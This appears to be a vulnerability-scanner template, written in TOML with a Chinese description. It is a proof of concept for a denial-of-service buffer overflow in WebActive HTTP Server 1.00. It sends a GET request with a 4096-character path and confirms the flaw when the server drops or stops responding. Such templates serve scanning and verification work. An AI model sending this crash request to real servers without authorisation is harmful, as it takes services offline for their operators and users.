[info]
author = "ave"
description = "向 WebActive HTTP Server 1.00 发送超长 URL 请求，触发缓冲区溢出导致服务崩溃。通过发送超长路径的 GET 请求后检测服务是否停止响应来验证漏洞存在。"
id = "POC-AVE-2000-0781"
name = "WebActive HTTP Server 缓冲区溢出拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0781"]
vuln_id = [
    "CVE-2000-0643",
    "AVE-2000-0781",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{repeat('A', 4096)}}"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "EOF",
    "connection refused",
    "reset by peer",
    "timeout",
]
